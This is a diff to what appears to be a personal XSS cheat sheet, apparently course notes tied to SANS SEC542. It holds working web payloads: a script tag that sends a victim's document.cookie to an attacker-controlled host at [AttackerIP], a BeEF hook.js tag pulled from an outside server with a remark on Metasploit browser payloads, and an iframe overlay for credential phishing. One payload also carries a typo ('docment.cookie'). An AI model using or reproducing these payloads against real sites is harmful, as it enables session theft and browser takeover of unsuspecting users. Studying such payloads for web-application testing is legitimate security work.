@@ -75,10 +75,10 @@ onfocus | send http request to the attacker's web server to reveal which control
 
 **Basic Stealing Cookie:**
 {% highlight html %}
-#Attacker
+<!-- Attacker -->
 python -m SimpleHTTPServer 
 
-#Victim
+<!-- Victim -->
 <script>document.location='http://[AttackerIP]/cgi-bin/grab.cgi?'+docment.cookie;</script>
 {% endhighlight %}
 
@@ -116,6 +116,12 @@ http://www.sec542.org/PhpMyAdmin/index.php?lang=<script>var lo=document.location
 </style>
 
 <iframe class="style11" src="http://127.127.127.127/www.sans.org/account/" frameborder="0" scrolling="no" />
+{% endhighlight %}
+
+**BEEF**
+{% highlight html %}
+<script src=http://beefserver:3000/hook.js></script>
+<!-- Most important is the browser exploitation - Metasploit attack payloads -->
 {% endhighlight %}
 
 > **Useful Resources**
